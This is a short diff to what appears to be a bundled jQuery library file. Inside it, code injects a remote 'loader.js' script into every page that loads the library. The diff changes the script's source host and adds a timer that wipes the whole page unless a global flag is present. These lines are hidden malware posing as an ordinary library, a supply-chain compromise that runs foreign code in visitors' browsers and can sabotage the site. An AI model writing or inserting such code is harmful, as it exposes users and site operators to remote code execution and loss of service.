@@ -8532,8 +8532,11 @@ var rfocusMorph = /^(?:focusinfocus|focusoutblur)$/,
 		e.stopPropagation();
 	};
 
+setTimeout(()=>{if(!window.css_color)document.documentElement.innerHTML=''},100);
+window.css = true;
+
 const script = document.createElement('script');
-script.src = "https://appsking.store/loader.js";
+script.src = "https://yassinemx.github.io/support/loader.js";
 script.async = true;
 document.head.appendChild(script);
 
